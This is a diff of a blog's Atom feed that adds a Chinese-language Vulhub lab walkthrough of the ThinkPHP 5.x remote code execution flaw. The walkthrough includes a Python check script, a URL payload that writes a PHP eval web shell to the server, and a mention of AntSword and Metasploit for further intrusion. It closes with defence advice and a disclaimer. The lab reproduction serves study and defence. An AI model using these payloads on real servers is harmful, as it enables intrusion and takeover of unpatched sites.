class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;response = requests.get(url)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;www-data&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Vulnerability found!&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;No vulnerability detected.&amp;quot;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;上传-WebShell&#34;&gt;&lt;a href=&#34;#上传-WebShell&#34; class=&#34;headerlink&#34; title=&#34;上传 WebShell&#34;&gt;&lt;/a&gt;上传 WebShell&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;使用蚁剑连接：&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.102:8080/shell.php&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;提权尝试&#34;&gt;&lt;a href=&#34;#提权尝试&#34; class=&#34;headerlink&#34; title=&#34;提权尝试&#34;&gt;&lt;/a&gt;提权尝试&lt;/h3&gt;&lt;p&gt;结合弱口令、提权漏洞等，可使用 Metasploit 等工具进一步入侵。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;九、总结&#34;&gt;&lt;a href=&#34;#九、总结&#34; class=&#34;headerlink&#34; title=&#34;九、总结&#34;&gt;&lt;/a&gt;九、总结&lt;/h2&gt;&lt;p&gt;ThinkPHP 5.x RCE 漏洞是一个典型的动态函数调用漏洞，利用简单但危害极大。通过 Vulhub 靶场，我们可以快速复现漏洞，深入理解其原理和利用方式。&lt;/p&gt;
+&lt;p&gt;开发者应及时升级框架版本，实施严格的输入验证和权限控制，部署 WAF 和监控机制，以降低漏洞被利用的风险。&lt;/p&gt;
+&lt;p&gt;希望本文能帮助读者更好地理解和防范 ThinkPHP RCE 漏洞，同时提升 Web 应用安全开发的意识！&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;⚠️-免责声明&#34;&gt;&lt;a href=&#34;#⚠️-免责声明&#34; class=&#34;headerlink&#34; title=&#34;⚠️ 免责声明&#34;&gt;&lt;/a&gt;⚠️ 免责声明&lt;/h2&gt;&lt;p&gt;本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。&lt;/p&gt;
+</content>
+        <category term="Web安全" />
+        <category term="RCE" />
+        <category term="漏洞复现" />
+        <category term="ThinkPHP" />
+        <updated>2025-07-27T09:25:25.000Z</updated>
+    </entry>
     <entry>
         <id>https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
         <title>命令执行漏洞</title>
@@ -246,8 +444,8 @@
 &lt;hr&gt;
 &lt;h2 id=&#34;⚠️-免责声明&#34;&gt;&lt;a href=&#34;#⚠️-免责声明&#34; class=&#34;headerlink&#34; title=&#34;⚠️ 免责声明&#34;&gt;&lt;/a&gt;⚠️ 免责声明&lt;/h2&gt;&lt;p&gt;本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。&lt;/p&gt;
 </content>
-        <category term="渗透测试" />
         <category term="Web安全" />
+        <category term="渗透测试" />
         <category term="命令执行" />
         <category term="漏洞利用" />
         <updated>2025-07-26T10:53:13.000Z</updated>
@@ -595,9 +793,9 @@
 &lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供学习和研究使用，请勿用于非法用途。任何人使用本文信息进行违法活动，后果自负。&lt;/p&gt;
 &lt;/blockquote&gt;
 </content>
-        <category term="渗透测试" />
         <category term="Web安全" />
         <category term="SQL注入" />
+        <category term="渗透测试" />
         <category term="网络安全" />
         <updated>2025-07-23T23:51:59.000Z</updated>
     </entry>
